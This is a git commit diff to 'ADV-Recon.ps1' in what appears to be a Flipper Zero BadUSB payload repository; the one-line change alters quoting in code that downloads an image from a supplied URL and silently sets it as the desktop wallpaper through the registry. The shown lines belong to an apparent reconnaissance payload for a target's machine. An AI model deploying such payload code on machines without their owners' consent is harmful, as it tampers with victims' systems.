01b288dad7bf672fa03e67631171b435407b97d0
jimmy-mc <james.mcmillan@gmail.com>
2025-05-16 18:36:28 +0100

    Update ADV-Recon.ps1

--- Payloads/Flip-ADV-Recon/ADV-Recon.ps1
+++ Payloads/Flip-ADV-Recon/ADV-Recon.ps1
@@ -564,7 +564,7 @@ if ($wp) {
     try {
         $wpPath = "$env:TEMP\wallpaper.jpg"
         Invoke-WebRequest -Uri $wp -OutFile $wpPath -UseBasicParsing
-        Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name Wallpaper -Value $wpPath
+        Set-ItemProperty -Path "HKCU:\Control Panel\Desktop\" -Name Wallpaper -Value $wpPath
         rundll32.exe user32.dll,UpdatePerUserSystemParameters
     } catch {
         Write-Warning "Failed to apply wallpaper: $_"
